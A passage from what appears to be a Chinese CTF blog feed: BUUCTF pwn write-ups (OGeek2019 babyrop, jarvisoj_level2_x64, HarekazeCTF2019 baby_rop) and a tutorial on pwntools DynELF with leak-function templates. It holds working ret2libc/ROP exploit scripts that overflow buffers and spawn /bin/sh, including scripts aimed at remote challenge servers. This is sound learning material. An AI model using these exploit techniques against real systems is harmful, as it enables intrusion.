    <content type="html"><![CDATA[<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>保护开了got表不可写以及nx</p><p>ida查看</p><p>主体是<img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_220445.png" alt=""></p><p>向buf中读入了一个随机数</p><p>下面两个函数依次是</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_220426.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_220452.png" alt=""></p><p>这里有两个不大熟悉的函数,原型及功能分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncmp</span>(<span class="type">const</span> <span class="type">char</span> *str1,<span class="type">const</span> cahr *str2,<span class="type">size_t</span> n)</span><br><span class="line">将str1与str2比较,最多比较前n个字节</span><br><span class="line"><span class="built_in">sprintf</span>(<span class="type">char</span> *<span class="built_in">string</span>,<span class="type">char</span> *format,arg_list);</span><br><span class="line">将格式化字符串format打印并送入<span class="built_in">string</span>字符串,arg_list是参数列表</span><br></pre></td></tr></table></figure><p>可以看到最后一个函数的读入字节数由第二个函数的返回值决定,</p><p>细看第二个函数,将s与buf比较,s中存的是随机数,肯定猜不到,这里也没有办法能够泄露或改写它,那么只能令v1等于0,即比较0个字节是否相同,那必然是相等的,要使v1等于0,只要buf开头是\0就行了,最后返回的是buf第8个字节</p><p>之后这题没有后门函数也没有binsh,那就是libc泄露类题目</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p=remote()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(puts_plt)+p32(<span class="number">0x08048825</span>)+p32(puts_got))</span><br><span class="line">puts=u32(p.recv()[-<span class="number">5</span>:-<span class="number">1</span>])  <span class="comment">#调用的是puts会自动在输出末尾加上换行注意过滤，这里其实直接p.recv(4)就行了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()  <span class="comment">#搜索已加载的C标准库中/bin/sh字符串的内存地址，并使用.__next__()方法来检索在库中找到的该字符串的第一个内存地址。</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>离大谱,自己泄露出来的libc怎么也打不通,最后发现题目给了libc🤡</p><p>细心的可能发现了</p><p>main_addr=e.symbols[‘__libc_start_main’]</p><p>这一句根本没用上</p><p>因为找不到main的symbols</p><p>所以我本来是打算用__libc_start_main作第一次rop的返回地址,但可以发现后面我并没有使用它,因为这么做是打不通的,至于为什么</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-29_232747.png" alt=""></p><p><strong>__libc_start_main是需要参数的!!!!!!!!!!</strong></p><p>因为这个硬生生被卡住了半个小时</p><p>也算吃了个教训,以后<strong>返回地址不能用__libc_start_main</strong></p><p><u>(之所以我会这么做,是因为我记岔了,__libc_start_main是可以用来做被泄露的函数,但我记成可以做返回地址了)</u></p><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>与jarvisoj_level2一样只不过变成了64位，注意参数传递方式即可</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28252</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004006b3</span></span><br><span class="line">binsh=<span class="number">0x600A90</span></span><br><span class="line">system=<span class="number">0x400603</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>和上一题一模一样</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26832</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x601048</span></span><br><span class="line">system=<span class="number">0x4005E3</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">继续</summary>
    
    
    
    <category term="题解" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="buuctf" scheme="https://ixout.github.io/tags/buuctf/"/>
    
    <category term="刷题记录" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>pwn技巧-DynELF</title>
    <link href="https://ixout.github.io/posts/69471/"/>
    <id>https://ixout.github.io/posts/69471/</id>
    <published>2023-03-26T04:39:50.000Z</published>
    <updated>2023-03-26T13:24:44.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DynELF？"><a href="#DynELF？" class="headerlink" title="DynELF？"></a>DynELF？</h1><p>DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄漏函数的情况下，可以解析任意加载库的任意符号地址。</p><p><strong>其原理就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</strong></p><h2 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h2><p>DynELF泄露函数方法最方便的使用情况是程序中最好含有write函数且可以多次调用main函数，不然的话还是用LibcSearcher的方法泄露比较好</p><h1 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h1><h2 id="官方文档给的例子"><a href="#官方文档给的例子" class="headerlink" title="官方文档给的例子"></a>官方文档给的例子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span>, address, enhex(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p><strong>log.debug(“%#x =&gt; %s”, address, enhex(data or ‘’))解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log.debug是pwntools中的日志工具，%#x表示输出一个整数的十六进制表示（带有0x前缀），%s表示输出一个字符串。address是要输出的内存地址，data是该地址对应的数据（一个字符串），enhex是pwntools中的工具函数，用于将字符串转换为十六进制表示的字符串（每个字节用两个十六进制字符表示），与encode(&#x27;hex&#x27;)相似。</span><br><span class="line">整个输出结果类似于：[DEBUG] 0x12345678 =&gt; 6162636465666768</span><br><span class="line">(data or &#x27;&#x27;)的作用是，当data变量为空（None）或者为False时，返回一个空字符串&#x27;&#x27;，否则返回data本身。</span><br></pre></td></tr></table></figure><h2 id="一个更具体的例子"><a href="#一个更具体的例子" class="headerlink" title="一个更具体的例子"></a>一个更具体的例子</h2><p><strong>源代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulfun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    vulfun();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello,World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;elf&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">data = p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./elf&#x27;</span>)</span><br><span class="line">d=DynELF(leak, ptr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a018</span></span><br><span class="line">pppr = <span class="number">0x080484bd</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) <span class="comment">#这里藏了一个之前没注意过的知识点①</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" red><summary> ① </summary>              <div class='content'>              <p>上面的exp使用了一个pppr(其实就是pop-pop-pop-ret),作为read的返回地址,这个是很有必要的,鉴于32位下返回地址和参数的互通性(64位也会但一般都不会超过6个参数）,如果read后直接接需要的函数地址那么read的参数又会变为所需函数的返回地址和参数,这显然不是我们所希望的,于是通过pppr来<strong>重新划分函数栈</strong></p>              </div>            </details><h1 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       p.send(payload2leak_addr)</span><br><span class="line">       data = p.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用DynELF时，我们需要使用一个<strong>leak函数</strong>作为<strong>必选参数</strong>，<u>指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数</u>，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了；<br>其中，<strong>leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的<u>int型参数addr</u><u>对应的内存地址中的数据</u>。</strong>且由于DynELF会多次调用leak函数，这个函数<u>必须能任意次使用</u>，即不能泄露几个地址之后就导致程序崩溃。<strong>由于需要泄露数据</strong>，<strong>payload中必然包含着打印函数，如write, puts, printf等</strong>；<br>而通过实践发现<strong>write函数是最理想的</strong>，因为write函数的特点在于<strong>其输出完全由其参数size决定</strong>，只要目标地址可读，<strong>size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响</strong>；<u>而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</u></p><p>结合上面的引例，对DynELF应该能有一个基础认识</p><h1 id="leak模板"><a href="#leak模板" class="headerlink" title="leak模板"></a>leak模板</h1><h2 id="Write函数模板"><a href="#Write函数模板" class="headerlink" title="Write函数模板"></a>Write函数模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line"><span class="comment">#address是待泄露的地址</span></span><br><span class="line">    payload = offset + p32(write) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#payload = 溢出位 + write\puts\printf + 返回地址 + 参数1 + 参数2 + 参数3</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>) </span><br><span class="line">    <span class="comment">#用于接受返回的地址，32位接收4位，64位接收8位</span></span><br><span class="line">log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">libc = DynELF(leak, elf=ELF(file_path))</span><br><span class="line"><span class="comment">#初始化DynELF模块，也就是程序的elf变量</span></span><br><span class="line">system_addr = libc.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="comment">#在libc文件中搜索system</span></span><br></pre></td></tr></table></figure><h2 id="puts函数模板"><a href="#puts函数模板" class="headerlink" title="puts函数模板"></a>puts函数模板</h2><p>puts 函数使用的参数只有一个，即需要输出的数据的起始地址，<strong>它会一直输出直到遇到 <u>\x00</u></strong>，所以它输出的数据长度是<u>不容易控制</u>的，我们无法预料到零字符会出现在哪里，截止后，<strong>puts 还会自动在末尾加上换行符</strong> 。<strong>该函数的优点是在 64 位程序中也可以很方便地使用。**</strong>缺点是会受到零字符截断的影响**，在写 leak 函数时需要特殊处理，在打印出的数据中正确地筛选我们需要的部分，如果打印出了空字符串，则要手动赋值<code>\x00</code>，包括我们在 dump 内存的时候，也常常受这个问题的困扰，</p><h2 id="Puts函数后没有其他输出"><a href="#Puts函数后没有其他输出" class="headerlink" title="Puts函数后没有其他输出"></a><code>Puts</code>函数后没有其他输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt_addr) + p32(main_addr) + p32(address)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;xxx\n&#x27;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="Puts函数后程序还有其他输出"><a href="#Puts函数后程序还有其他输出" class="headerlink" title="Puts函数后程序还有其他输出"></a><code>Puts</code>函数后程序还有其他输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&quot;&quot;</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&quot;xxx\n&quot;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;x&quot;</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line">      data = buf[:-<span class="number">1</span>]                     </span><br><span class="line">      data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>了解一下,要求不高</p><h2 id="获取elf内存加载基地址"><a href="#获取elf内存加载基地址" class="headerlink" title="获取elf内存加载基地址"></a>获取elf内存加载基地址</h2><p>已知elf加载内存范围内的一个地址ptr，将该地址进行页对齐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page_size = 0x1000page_mask = ~(page_size - 1)ptr &amp;= page_mask</span><br></pre></td></tr></table></figure><p>然后对比内存页起始字符串是否为’\x7fELF’，如果不是，一直向低地址内存页(ptr -= page_size)进行查找，找到符合该条件的页面，该页面起始地址就是elf文件内存加载基地址。</p><p>寻找elf内存加载基地址的示意图如下：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144448.png" alt=""></p><h2 id="获取libc-so内存加载基地址"><a href="#获取libc-so内存加载基地址" class="headerlink" title="获取libc.so内存加载基地址"></a>获取libc.so内存加载基地址</h2><p>elf是动态链接的可执行文件，在该类型文件中有一个link_map双向链表，其中包含了每个动态加载的库的路径和加载基址等信息</p><p>可以通过两种途径获取link_map链表：一是在所有ELF文件中，通过Dynamic段DT_DEBUG区域得到。二是在non-RELRO ELF文件中，link_map地址存在于.got.plt区节中，该区节的加载地址可以从DYNAMIC段DT_PLTGOT区域得到。</p><p>这两种途径都需要知道elf的DYNAMIC段地址：我们在第一步中获取了elf内存加载基地址，由此可以得到elf段表，通过解析elf段表可以得到DYNAMIC基地址。</p><p>通过第二种方式获取link_map结构的示意图如下：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144541.png" alt=""></p><h2 id="获取libc-so的hash表、动态符号表、字符串表基地址"><a href="#获取libc-so的hash表、动态符号表、字符串表基地址" class="headerlink" title="获取libc.so的hash表、动态符号表、字符串表基地址"></a>获取libc.so的hash表、动态符号表、字符串表基地址</h2><p>在所有需要导出函数给其他文件使用的ELF文件（例如: “libc.so”）中，用动态符号表、字符串表、hash表等一系列表用于指示导出符号（例如:”system”）的名称、地址、hash值等信息。通过libc.so的Dynamic段DT_GNU_HASH、DT_SYMTAB、DT_STRTAB可以获取hash表、动态符号表、字符串表在内存中的基地址。</p><h2 id="通过hash表获取system函数地址"><a href="#通过hash表获取system函数地址" class="headerlink" title="通过hash表获取system函数地址"></a>通过hash表获取system函数地址</h2><p>hash表是用于查找符号的散列表，通过libc.so的hash表可以找到system函数内存加载地址，在ELF文件中有SYSV、GNU两种类型的hash表，其中通过GNU HASH查找system函数地址示意图如下。</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144815.png" alt=""></p><p>图中： nbuckets是hash buckets的数值，symndx是hash表映射符号表的起始索引，Bloom Filter用作过滤不在符号表中的符号名称，在DynELF中并没有使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=gnu_hash(“system”)，gnu_hash是GNU HASH算法函数ndx=hash%nbuckets，ndx是符号表中所有 符号HASH%nubuckets 相等的起始索引</span><br></pre></td></tr></table></figure><p>最后：内存泄露函数在过程中用作读取程序内存数据，像上面例子中获取link_map、DYNAMIC段、elf段表等内容都是通过内存泄露函数。</p>]]></content>
    
    
    <summary type="html">DynELF????</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="技巧" scheme="https://ixout.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
    <category term="DynELF" scheme="https://ixout.github.io/tags/DynELF/"/>
    
  </entry>
  
  <entry>
    <title>工具使用手册</title>
